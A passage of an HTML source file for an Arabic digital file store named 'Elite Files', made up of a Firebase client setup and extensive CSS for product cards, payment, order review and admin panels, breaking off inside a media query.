<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Elite Files | متجر الملفات الرقمية الفاخر</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap" rel="stylesheet">
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage-compat.js"></script>
</head>
<body>
    <!-- Firebase Initialization Script -->
    <script>
        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
            authDomain: "starkoscript.firebaseapp.com",
            databaseURL: "https://starkoscript-default-rtdb.firebaseio.com",
            projectId: "starkoscript",
            storageBucket: "starkoscript.appspot.com",
            messagingSenderId: "381525854892",
            appId: "1:381525854892:android:50ba5daa1cffae8faa2d09"
        };
        
        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const storage = firebase.storage();
    </script>
    
    <style>
        /* Reset & Base */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Cairo', sans-serif;
        }
        
        :root {
            --gold: #FFD700;
            --dark-gold: #D4AF37;
            --black: #0A0A0A;
            --gray: #1A1A1A;
            --light-gray: #2A2A2A;
            --white: #FFFFFF;
            --red: #E74C3C;
            --green: #27AE60;
            --blue: #3498DB;
            --purple: #9B59B6;
            --orange: #F39C12;
        }
        
        body {
            background: linear-gradient(135deg, #0A0A0A 0%, #1A1A1A 100%);
            color: var(--white);
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        /* Header */
        .main-header {
            background: linear-gradient(90deg, var(--black) 0%, var(--gray) 100%);
            padding: 25px 0;
            border-bottom: 3px solid var(--gold);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            position: relative;
            z-index: 100;
        }
        
        .header-content {
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
            cursor: pointer;
        }
        
        .logo i {
            color: var(--gold);
            font-size: 2.8rem;
            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.3));
        }
        
        .logo h1 {
            font-size: 2.2rem;
            font-weight: 900;
            background: linear-gradient(to right, var(--gold), var(--dark-gold));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 2px 10px rgba(255, 215, 0, 0.2);
        }
        
        .logo span {
            color: var(--white);
            font-weight: 300;
        }
        
        .user-badge {
            background: linear-gradient(45deg, var(--blue), #2980b9);
            color: var(--white);
            padding: 10px 25px;
            border-radius: 30px;
            font-weight: 700;
            font-size: 1rem;
            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.2);
            display: flex;
            align-items: center;
            gap: 10px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .user-badge:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(52, 152, 219, 0.3);
        }
        
        .admin-badge {
            background: linear-gradient(45deg, var(--gold), var(--dark-gold));
            color: var(--black);
            padding: 10px 25px;
            border-radius: 30px;
            font-weight: 700;
            font-size: 1rem;
            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.2);
            display: flex;
            align-items: center;
            gap: 10px;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .admin-badge:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(255, 215, 0, 0.3);
        }
        
        /* Container */
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        
        /* Sections */
        .section {
            margin-bottom: 60px;
            padding: 40px;
            background: rgba(20, 20, 20, 0.9);
            border-radius: 25px;
            border: 1px solid rgba(255, 215, 0, 0.2);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(15px);
            position: relative;
            overflow: hidden;
            transition: all 0.3s ease;
        }
        
        .section:hover {
            border-color: rgba(255, 215, 0, 0.3);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
        }
        
        .section::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 6px;
            height: 100%;
            background: linear-gradient(to bottom, var(--gold), var(--dark-gold));
        }
        
        .section-title {
            font-size: 2.2rem;
            margin-bottom: 40px;
            color: var(--gold);
            display: flex;
            align-items: center;
            gap: 20px;
            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.5);
            padding-bottom: 15px;
            border-bottom: 2px solid rgba(255, 215, 0, 0.2);
        }
        
        .section-title i {
            font-size: 2.5rem;
        }
        
        /* Files Grid */
        .files-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
            gap: 40px;
            margin-bottom: 50px;
        }
        
        .file-card {
            background: linear-gradient(145deg, #1A1A1A, #121212);
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.4);
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            border: 1px solid rgba(255, 215, 0, 0.15);
            position: relative;
        }
        
        .file-card:hover {
            transform: translateY(-15px) scale(1.02);
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6), 0 0 0 2px rgba(255, 215, 0, 0.2);
        }
        
        .file-header {
            padding: 30px 25px;
            background: linear-gradient(135deg, var(--black), var(--gray));
            text-align: center;
            border-bottom: 2px solid rgba(255, 215, 0, 0.25);
            position: relative;
            overflow: hidden;
        }
        
        .file-header::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,215,0,0.1) 0%, transparent 70%);
            animation: rotate 20s linear infinite;
        }
        
        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .file-icon {
            font-size: 4rem;
            margin-bottom: 20px;
            color: var(--gold);
            filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.4));
            position: relative;
            z-index: 1;
        }
        
        .file-name {
            font-size: 1.6rem;
            font-weight: 800;
            color: var(--white);
            margin-bottom: 8px;
            position: relative;
            z-index: 1;
            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
        }
        
        .file-price {
            font-size: 2rem;
            font-weight: 900;
            color: var(--gold);
            text-shadow: 0 0 15px rgba(255, 215, 0, 0.4);
            position: relative;
            z-index: 1;
        }
        
        .free-badge {
            font-size: 2rem;
            font-weight: 900;
            color: var(--green);
            text-shadow: 0 0 15px rgba(39, 174, 96, 0.4);
            position: relative;
            z-index: 1;
        }
        
        .file-body {
            padding: 30px 25px;
            position: relative;
            z-index: 1;
        }
        
        .file-description {
            color: #DDDDDD;
            font-size: 1.1rem;
            line-height: 1.8;
            margin-bottom: 30px;
            min-height: 130px;
        }
        
        .file-details {
            display: flex;
            justify-content: space-between;
            margin-bottom: 30px;
            padding: 20px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .file-detail {
            text-align: center;
            flex: 1;
        }
        
        .file-detail i {
            color: var(--gold);
            font-size: 1.4rem;
            margin-bottom: 10px;
            display: block;
        }
        
        .file-detail span {
            font-size: 0.95rem;
            color: #BBBBBB;
        }
        
        .file-actions {
            display: flex;
            gap: 12px;
        }
        
        .buy-btn {
            flex: 1;
            padding: 18px;
            background: linear-gradient(45deg, var(--gold), var(--dark-gold));
            color: var(--black);
            border: none;
            border-radius: 12px;
            font-size: 1.3rem;
            font-weight: 900;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 12px;
            box-shadow: 0 7px 20px rgba(255, 215, 0, 0.25);
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
        }
        
        .buy-btn:hover {
            background: linear-gradient(45deg, var(--dark-gold), var(--gold));
            transform: translateY(-3px) scale(1.03);
            box-shadow: 0 10px 25px rgba(255, 215, 0, 0.35);
        }
        
        .download-btn {
            flex: 1;
            padding: 18px;
            background: linear-gradient(45deg, var(--green), #2ECC71);
            color: var(--white);
            border: none;
            border-radius: 12px;
            font-size: 1.3rem;
            font-weight: 900;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 12px;
            box-shadow: 0 7px 20px rgba(39, 174, 96, 0.25);
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
        }
        
        .download-btn:hover {
            background: linear-gradient(45deg, #2ECC71, var(--green));
            transform: translateY(-3px) scale(1.03);
            box-shadow: 0 10px 25px rgba(39, 174, 96, 0.35);
        }
        
        .download-free-btn {
            width: 100%;
            padding: 18px;
            background: linear-gradient(45deg, var(--green), #2ECC71);
            color: var(--white);
            border: none;
            border-radius: 12px;
            font-size: 1.3rem;
            font-weight: 900;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 12px;
            box-shadow: 0 7px 20px rgba(39, 174, 96, 0.25);
            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
        }
        
        .download-free-btn:hover {
            background: linear-gradient(45deg, #2ECC71, var(--green));
            transform: translateY(-3px) scale(1.03);
            box-shadow: 0 10px 25px rgba(39, 174, 96, 0.35);
        }
        
        /* Admin Panel */
        .admin-panel {
            background: rgba(15, 15, 15, 0.95);
            border: 2px solid var(--gold);
            border-radius: 25px;
            padding: 40px;
            margin-top: 40px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.6);
        }
        
        .admin-title {
            color: var(--gold);
            font-size: 2rem;
            margin-bottom: 35px;
            text-align: center;
            text-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
            padding-bottom: 20px;
            border-bottom: 2px solid rgba(255, 215, 0, 0.2);
        }
        
        .admin-form {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 25px;
            margin-bottom: 40px;
        }
        
        .form-group {
            display: flex;
            flex-direction: column;
        }
        
        .form-group label {
            margin-bottom: 12px;
            color: var(--gold);
            font-weight: 700;
            font-size: 1.1rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .form-control {
            padding: 18px;
            background: rgba(255, 255, 255, 0.07);
            border: 2px solid rgba(255, 215, 0, 0.25);
            border-radius: 12px;
            color: var(--white);
            font-size: 1.1rem;
            transition: all 0.3s;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--gold);
            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.15);
            background: rgba(255, 255, 255, 0.1);
        }
        
        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 10px;
        }
        
        .checkbox-group input[type="checkbox"] {
            width: 22px;
            height: 22px;
            accent-color: var(--gold);
            cursor: pointer;
        }
        
        .file-upload-area {
            border: 3px dashed rgba(255, 215, 0, 0.35);
            border-radius: 15px;
            padding: 50px 25px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 8px;
            background: rgba(255, 215, 0, 0.03);
        }
        
        .file-upload-area:hover {
            border-color: var(--gold);
            background: rgba(255, 215, 0, 0.07);
            transform: translateY(-2px);
        }
        
        .file-upload-area i {
            font-size: 4rem;
            color: var(--gold);
            margin-bottom: 20px;
            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.3));
        }
        
        .submit-btn {
            grid-column: 1 / -1;
            padding: 20px;
            background: linear-gradient(45deg, var(--green), #2ECC71);
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 1.4rem;
            font-weight: 900;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 15px;
            box-shadow: 0 8px 25px rgba(39, 174, 96, 0.3);
        }
        
        .submit-btn:hover {
            background: linear-gradient(45deg, #2ECC71, var(--green));
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 12px 30px rgba(39, 174, 96, 0.4);
        }
        
        /* Payment Section */
        .payment-section {
            background: rgba(15, 15, 15, 0.95);
            border-radius: 25px;
            padding: 40px;
            margin-top: 40px;
            border: 2px solid rgba(52, 152, 219, 0.35);
            display: none;
        }
        
        .payment-title {
            color: var(--blue);
            font-size: 2rem;
            margin-bottom: 35px;
            display: flex;
            align-items: center;
            gap: 20px;
            padding-bottom: 20px;
            border-bottom: 2px solid rgba(52, 152, 219, 0.2);
        }
        
        .payment-steps {
            display: flex;
            flex-direction: column;
            gap: 30px;
            margin-bottom: 40px;
        }
        
        .payment-step {
            background: rgba(255, 255, 255, 0.05);
            padding: 25px;
            border-radius: 15px;
            border-right: 5px solid var(--blue);
            transition: all 0.3s;
        }
        
        .payment-step:hover {
            background: rgba(255, 255, 255, 0.07);
            transform: translateY(-3px);
        }
        
        .step-number {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: var(--blue);
            color: white;
            width: 35px;
            height: 35px;
            border-radius: 50%;
            font-weight: 900;
            margin-left: 15px;
            font-size: 1.2rem;
            box-shadow: 0 4px 10px rgba(52, 152, 219, 0.3);
        }
        
        .payment-info {
            background: rgba(255, 215, 0, 0.12);
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            margin: 25px 0;
            border: 2px solid rgba(255, 215, 0, 0.2);
        }
        
        .phone-number {
            font-size: 2.5rem;
            font-weight: 900;
            color: var(--gold);
            direction: ltr;
            text-shadow: 0 0 20px rgba(255, 215, 0, 0.4);
            margin: 20px 0;
            letter-spacing: 2px;
        }
        
        .upload-area {
            border: 3px dashed rgba(255, 215, 0, 0.35);
            border-radius: 15px;
            padding: 50px 25px;
            text-align: center;
            margin: 30px 0;
            cursor: pointer;
            transition: all 0.3s;
            background: rgba(255, 215, 0, 0.03);
        }
        
        .upload-area:hover {
            border-color: var(--gold);
            background: rgba(255, 215, 0, 0.07);
            transform: translateY(-2px);
        }
        
        .upload-area i {
            font-size: 4rem;
            color: var(--gold);
            margin-bottom: 20px;
            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.3));
        }
        
        .payment-options {
            display: flex;
            gap: 20px;
            margin-top: 25px;
            flex-wrap: wrap;
        }
        
        .whatsapp-btn {
            flex: 1;
            min-width: 200px;
            padding: 16px 30px;
            background: linear-gradient(45deg, #25D366, #128C7E);
            color: white;
            border: none;
            border-radius: 12px;
            font-weight: 800;
            font-size: 1.2rem;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            box-shadow: 0 7px 20px rgba(37, 211, 102, 0.25);
        }
        
        .whatsapp-btn:hover {
            background: linear-gradient(45deg, #128C7E, #25D366);
            transform: translateY(-3px) scale(1.03);
            box-shadow: 0 12px 25px rgba(37, 211, 102, 0.35);
        }
        
        /* Orders Section */
        .orders-container {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
            gap: 30px;
            margin-top: 30px;
        }
        
        .order-card {
            background: rgba(26, 26, 26, 0.8);
            border-radius: 20px;
            padding: 30px;
            border: 1px solid rgba(255, 215, 0, 0.2);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
            transition: all 0.3s;
        }
        
        .order-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
            border-color: rgba(255, 215, 0, 0.3);
        }
        
        .order-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .order-file {
            font-size: 1.4rem;
            font-weight: 800;
            color: var(--gold);
        }
        
        .order-status {
            padding: 10px 20px;
            border-radius: 25px;
            font-weight: 800;
            font-size: 0.95rem;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
        }
        
        .status-pending {
            background: linear-gradient(45deg, rgba(231, 76, 60, 0.2), rgba(192, 57, 43, 0.2));
            color: var(--red);
            border: 1px solid rgba(231, 76, 60, 0.3);
        }
        
        .status-completed {
            background: linear-gradient(45deg, rgba(39, 174, 96, 0.2), rgba(46, 204, 113, 0.2));
            color: var(--green);
            border: 1px solid rgba(39, 174, 96, 0.3);
        }
        
        .order-details {
            margin-bottom: 25px;
        }
        
        .order-detail {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            padding-bottom: 12px;
            border-bottom: 1px dashed rgba(255, 255, 255, 0.07);
        }
        
        .order-detail:last-child {
            border-bottom: none;
        }
        
        .order-proof {
            margin: 20px 0;
            padding: 20px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 12px;
        }
        
        .order-proof img {
            max-width: 100%;
            max-height: 300px;
            border-radius: 10px;
            margin-top: 15px;
            border: 2px solid rgba(255, 215, 0, 0.3);
            cursor: pointer;
            transition: all 0.3s;
            object-fit: contain;
            background: #000;
        }
        
        .order-proof img:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
        }
        
        .proof-actions {
            display: flex;
            gap: 10px;
            margin-top: 15px;
            flex-wrap: wrap;
        }
        
        .confirm-btn {
            flex: 1;
            min-width: 150px;
            padding: 14px;
            background: linear-gradient(45deg, var(--green), #2ECC71);
            color: white;
            border: none;
            border-radius: 10px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .confirm-btn:hover {
            background: linear-gradient(45deg, #2ECC71, var(--green));
            transform: translateY(-2px);
        }
        
        .reject-btn {
            flex: 1;
            min-width: 150px;
            padding: 14px;
            background: linear-gradient(45deg, var(--red), #C0392B);
            color: white;
            border: none;
            border-radius: 10px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .reject-btn:hover {
            background: linear-gradient(45deg, #C0392B, var(--red));
            transform: translateY(-2px);
        }
        
        .delete-proof-btn {
            padding: 10px 20px;
            background: linear-gradient(45deg, var(--orange), #E67E22);
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            width: 100%;
        }
        
        .delete-proof-btn:hover {
            background: linear-gradient(45deg, #E67E22, var(--orange));
            transform: translateY(-2px);
        }
        
        /* Login Section */
        .login-section {
            background: rgba(20, 20, 20, 0.95);
            border-radius: 25px;
            padding: 50px;
            text-align: center;
            border: 3px solid var(--gold);
            max-width: 500px;
            margin: 60px auto;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
        }
        
        .login-title {
            color: var(--gold);
            font-size: 2.8rem;
            margin-bottom: 40px;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
        }
        
        .login-input {
            width: 100%;
            padding: 22px;
            background: rgba(255, 255, 255, 0.07);
            border: 2px solid rgba(255, 215, 0, 0.25);
            border-radius: 15px;
            color: var(--white);
            font-size: 1.3rem;
            text-align: center;
            margin-bottom: 30px;
            transition: all 0.3s;
        }
        
        .login-input:focus {
            outline: none;
            border-color: var(--gold);
            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.15);
            background: rgba(255, 255, 255, 0.1);
        }
        
        .login-btn {
            width: 100%;
            padding: 22px;
            background: linear-gradient(45deg, var(--gold), var(--dark-gold));
            color: var(--black);
            border: none;
            border-radius: 15px;
            font-size: 1.4rem;
            font-weight: 900;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 10px 25px rgba(255, 215, 0, 0.3);
        }
        
        .login-btn:hover {
            background: linear-gradient(45deg, var(--dark-gold), var(--gold));
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 15px 30px rgba(255, 215, 0, 0.4);
        }
        
        /* Admin Login Modal */
        .admin-login-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            z-index: 2000;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .admin-login-content {
            background: rgba(20, 20, 20, 0.98);
            border-radius: 25px;
            padding: 50px;
            max-width: 500px;
            width: 100%;
            border: 3px solid var(--gold);
            box-shadow: 0 20px 60px rgba(255, 215, 0, 0.2);
            position: relative;
            animation: modalSlide 0.4s ease-out;
        }
        
        @keyframes modalSlide {
            from {
                transform: translateY(-50px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
        
        .close-modal {
            position: absolute;
            top: 20px;
            left: 20px;
            color: var(--gold);
            font-size: 2rem;
            cursor: pointer;
            background: none;
            border: none;
            transition: all 0.3s;
        }
        
        .close-modal:hover {
            transform: rotate(90deg);
        }
        
        /* File Management */
        .file-management {
            margin-top: 40px;
        }
        
        .file-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            margin-bottom: 15px;
            border: 1px solid rgba(255, 215, 0, 0.15);
            transition: all 0.3s;
        }
        
        .file-item:hover {
            background: rgba(255, 255, 255, 0.08);
            transform: translateY(-2px);
        }
        
        .file-item-info {
            flex: 1;
        }
        
        .file-item-name {
            font-size: 1.3rem;
            font-weight: 700;
            color: var(--gold);
            margin-bottom: 8px;
        }
        
        .file-item-details {
            color: #AAAAAA;
            font-size: 0.95rem;
        }
        
        .file-actions-admin {
            display: flex;
            gap: 12px;
        }
        
        .edit-btn, .delete-btn, .toggle-btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 8px;
            transition: all 0.3s;
        }
        
        .edit-btn {
            background: linear-gradient(45deg, var(--blue), #2980b9);
            color: white;
        }
        
        .edit-btn:hover {
            background: linear-gradient(45deg, #2980b9, var(--blue));
            transform: translateY(-2px);
        }
        
        .delete-btn {
            background: linear-gradient(45deg, var(--red), #C0392B);
            color: white;
        }
        
        .delete-btn:hover {
            background: linear-gradient(45deg, #C0392B, var(--red));
            transform: translateY(-2px);
        }
        
        .toggle-btn {
            background: linear-gradient(45deg, var(--purple), #8E44AD);
            color: white;
        }
        
        .toggle-btn:hover {
            background: linear-gradient(45deg, #8E44AD, var(--purple));
            transform: translateY(-2px);
        }
        
        /* Footer */
        .main-footer {
            background: var(--black);
            padding: 50px 0;
            margin-top: 80px;
            border-top: 3px solid var(--gold);
            text-align: center;
            position: relative;
        }
        
        .main-footer::before {
            content: '';
            position: absolute;
            top: -3px;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, var(--gold), var(--dark-gold), var(--gold));
        }
        
        .footer-content {
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 20px;
        }
        
        .copyright {
            color: #AAAAAA;
            font-size: 1.1rem;
            margin-top: 25px;
        }
        
        .copyright i {
            color: var(--red);
            margin: 0 5px;
        }
        
        /* Hidden class */
        .hidden {
            display: none;
        }
        
        /* Back Navigation */
        .back-nav {
            display: flex;
            justify-content: flex-end;
            margin-top: 30px;
        }
        
        .back-btn {
            padding: 15px 30px;
            background: linear-gradient(45deg, #7f8c8d, #95a5a6);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 1.2rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 5px 15px rgba(127, 140, 141, 0.2);
        }
        
        .back-btn:hover {
            background: linear-gradient(45deg, #95a5a6, #7f8c8d);
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(127, 140, 141, 0.3);
        }
        
        /* Security Features */
        .security-features {
            position: fixed;
            bottom: 20px;
            left: 20px;
            display: flex;
            flex-direction: column;
            gap: 10px;
            z-index: 999;
        }
        
        .security-badge {
            background: rgba(0, 0, 0, 0.8);
            padding: 12px 20px;
            border-radius: 30px;
            border: 1px solid var(--gold);
            font-size: 0.9rem;
            color: var(--gold);
            display: flex;
            align-items: center;
            gap: 10px;
            backdrop-filter: blur(10px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        
        /* Progress Bar */
        .progress-container {
            width: 100%;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            margin: 20px 0;
            overflow: hidden;
            display: none;
        }
        
        .progress-bar {
            width: 0%;
            height: 8px;
            background: linear-gradient(90deg, var(--green), #2ECC71);
            border-radius: 10px;
            transition: width 0.3s ease;
        }
        
        /* Loading Spinner */
        .loading-spinner {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 9999;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 215, 0, 0.3);
            border-radius: 50%;
            border-top-color: var(--gold);
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Notifications */
        .notification {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--green);
            color: white;
            padding: 18px 35px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
            z-index: 10000;
            font-weight: 800;
            display: none;
            animation: slideIn 0.3s ease-out;
            text-align: center;
            min-width: 300px;
            max-width: 90%;
        }
        
        .notification.error {
            background: var(--red);
        }
        
        .notification.info {
            background: var(--blue);
        }
        
        .notification.warning {
            background: var(--orange);
        }
        
        @keyframes slideIn {
            from {
                top: -100px;
                opacity: 0;
            }
            to {
                top: 20px;
                opacity: 1;
            }
        }
        
        /* Admin Control Panel Styles */
        .admin-control-panel {
            margin-top: 50px;
            padding: 30px;
            background: rgba(20, 20, 20, 0.9);
            border-radius: 20px;
            border: 2px solid var(--purple);
        }
        
        .admin-control-title {
            color: var(--purple);
            font-size: 1.8rem;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            gap: 15px;
            padding-bottom: 15px;
            border-bottom: 2px solid rgba(155, 89, 182, 0.3);
        }
        
        .admin-control-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 25px;
            margin-top: 20px;
        }
        
        .admin-control-card {
            background: rgba(30, 30, 30, 0.8);
            border-radius: 15px;
            padding: 25px;
            border: 1px solid rgba(155, 89, 182, 0.2);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
        }
        
        .control-card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .user-list, .service-list {
            max-height: 400px;
            overflow-y: auto;
            margin-top: 15px;
        }
        
        .user-item, .service-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            margin-bottom: 10px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
            transition: all 0.3s;
        }
        
        .user-item:hover, .service-item:hover {
            background: rgba(255, 255, 255, 0.08);
        }
        
        .user-actions, .service-actions {
            display: flex;
            gap: 8px;
        }
        
        .action-btn {
            padding: 6px 12px;
            border: none;
            border-radius: 6px;
            font-size: 0.9rem;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
            transition: all 0.3s;
        }
        
        .btn-view {
            background: linear-gradient(45deg, var(--blue), #2980b9);
            color: white;
        }
        
        .btn-disable {
            background: linear-gradient(45deg, var(--orange), #E67E22);
            color: white;
        }
        
        .btn-delete {
            background: linear-gradient(45deg, var(--red), #C0392B);
            color: white;
        }
        
        .btn-create {
            background: linear-gradient(45deg, var(--green), #2ECC71);
            color: white;
        }
        
        /* Vodafone Service Page */
        .vodafone-service-page {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            z-index: 3000;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .vodafone-service-content {
            background: rgba(20, 20, 20, 0.98);
            border-radius: 25px;
            padding: 40px;
            max-width: 500px;
            width: 100%;
            border: 3px solid var(--blue);
            box-shadow: 0 20px 60px rgba(52, 152, 219, 0.2);
            position: relative;
        }
        
        .vodafone-title {
            color: var(--blue);
            font-size: 2rem;
            text-align: center;
            margin-bottom: 30px;
        }
        
        .vodafone-form {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        
        .vodafone-result {
            margin-top: 25px;
            padding: 20px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 12px;
            border: 1px solid rgba(255, 215, 0, 0.2);
            display: none;
        }
        
        /* Status Colors */
        .status-rejected {
            background: linear-gradient(45deg, rgba(231, 76, 60, 0.2), rgba(192, 57, 43, 0.2));
            color: var(--red);
            border: 1px solid rgba(231, 76, 60, 0.3);
        }
        
        /* Responsive */
        @media (max-width: 1024px) {
            .files-grid {
                grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
                gap: 30px;
                }
            
            .orders-container {
                grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            }
            
            .admin-control-grid {
                grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            }
        }
        
        @media (max-width: 768px) {
            .header-content {
                flex-direction: column;
                gap: 25px;
                text-align: center;
            }
            
            .files-grid {
                grid-template-columns: 1fr;
            }
            
            .admin-form {
                grid-template-columns: 1fr;
            }
            
            .orders-container {
                grid-template-columns: 1fr;
            }
            
            .phone-number {
                font-size: 2rem;
            }
            
            .payment-options {
                flex-direction: column;
            }
            
            .file-item {
                flex-direction: column;
                align-items: flex-start;
                gap: 15px;
            }
            
            .file-actions-admin {
                width: 100%;
                justify-content: flex-end;
            }
            
            .section {
                padding: 30px 20px;
